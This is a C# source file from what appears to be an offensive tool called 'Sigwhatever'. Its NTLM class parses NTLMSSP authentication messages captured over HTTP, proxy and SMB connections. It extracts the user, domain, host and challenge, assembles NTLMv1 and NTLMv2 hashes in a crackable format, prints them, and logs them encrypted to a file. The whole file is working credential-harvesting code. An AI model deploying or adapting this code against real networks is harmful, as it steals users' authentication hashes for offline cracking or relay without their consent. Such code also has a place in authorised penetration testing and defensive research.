using Microsoft.Office.Interop.Word;
using System;
using System.Collections.Generic;
using System.IO;

namespace Sigwhatever
{
    class NTLM
    {

        public static List<string> lstCaptured = new List<string>();

        public static void GetNTLMResponse(byte[] field, string sourceIP, string sourcePort, string protocol, string protocolPort, string Logfile)
        {
            Crypto Crypt1 = new Crypto();
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("4E544C4D53535000");
            string lmResponse = "";
            string ntlmResponse = "";
            int ntlmLength = 0;
            string challenge = "";
            string domain = "";
            string user = "";
            string host = "";


            if ((String.Equals(protocol, "HTTP") || String.Equals(protocol, "Proxy") || index > 0) && payload.Substring((index + 16), 8) == "03000000")
            {
                int ntlmsspOffset = index / 2;
                int lmLength = (int)Util.UInt16DataLength((ntlmsspOffset + 12), field);
                int lmOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 16), field);
                byte[] lmPayload = new byte[lmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + lmOffset), lmPayload, 0, lmPayload.Length);
                lmResponse = System.BitConverter.ToString(lmPayload).Replace("-", String.Empty);
                ntlmLength = (int)Util.UInt16DataLength((ntlmsspOffset + 20), field);
                int ntlmOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 24), field);
                byte[] ntlmPayload = new byte[ntlmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + ntlmOffset), ntlmPayload, 0, ntlmPayload.Length);
                ntlmResponse = System.BitConverter.ToString(ntlmPayload).Replace("-", String.Empty);
                int domainLength = (int)Util.UInt16DataLength((ntlmsspOffset + 28), field);
                int domainOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 32), field);
                byte[] domainPayload = new byte[domainLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + domainOffset), domainPayload, 0, domainPayload.Length);
                domain = Util.DataToString((ntlmsspOffset + domainOffset), domainLength, field);
                int userLength = (int)Util.UInt16DataLength((ntlmsspOffset + 36), field);
                int userOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 40), field);
                byte[] userPayload = new byte[userLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + userOffset), userPayload, 0, userPayload.Length);
                user = Util.DataToString((ntlmsspOffset + userOffset), userLength, field);
                int hostLength = (int)Util.UInt16DataLength((ntlmsspOffset + 44), field);
                int hostOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 48), field);
                byte[] hostPayload = new byte[hostLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
                host = Util.DataToString((ntlmsspOffset + hostOffset), hostLength, field);


                
                if (!String.Equals(protocol, "SMB"))
                {
                    try
                    {
                        challenge = Program.httpSessionTable[session].ToString();
                    }
                    catch
                    {

                        try
                        {
                            //need better better method of tracking challenges when source port changes between challenge and response 
                            int newSourcePort = Int32.Parse(sourcePort) - 1;
                            string newSession = sourceIP + ":" + newSourcePort;
                            challenge = Program.httpSessionTable[newSession].ToString();
                        }
                        catch
                        {
                            challenge = "";
                        }

                    }

                }

                if (ntlmLength > 24)
                {
                    string ntlmV2Hash = user + "::" + domain + ":" + challenge + ":" + ntlmResponse.Insert(32, ":");

                    lock (Program.outputList)
                    {

                        if (String.Equals(protocol, "SMB") && Program.enabledSMB || !String.Equals(protocol, "SMB"))
                        {

                            if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                            {

                                if (!String.IsNullOrEmpty(challenge))
                                {

                                    if (!lstCaptured.Contains(domain + user))
                                    {
                                        Console.WriteLine(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:{8}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, ntlmV2Hash));
                                        string printme = Crypt1.Encrypt(ntlmV2Hash, TCPHTTPCap.key);
                                        //Must check the log file exists here at some point....todo
                                        if (Logfile != null && Logfile.Length > 1)
                                        {
                                            File.AppendAllText(Logfile, printme);
                                            File.AppendAllText(Logfile, "\n\n");
                                        }

                                        lstCaptured.Add(domain + user);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Already got a hash for " + user);
                                    }


                                    



                                }
                              

                            }
                          

                        }
                       

                    }

                }
                else if (ntlmLength == 24)
                {
                    string ntlmV1Hash = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;

                    lock (Program.outputList)
                    {

                        if (Program.enabledSMB)
                        {

                            if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                            {

                                if (!String.IsNullOrEmpty(challenge))
                                {

                       
                                        Console.WriteLine(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}:{8}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, ntlmV1Hash));
                                        string printme = Crypt1.Encrypt(ntlmV1Hash, TCPHTTPCap.key);
                                          if (Logfile != null)
                                           {
                                               File.AppendAllText(Logfile, printme);
                                               File.AppendAllText(Logfile, "\n\n");
                                           }




                                }


                            }


                        }


                    }

                }


            }

        }

    }

}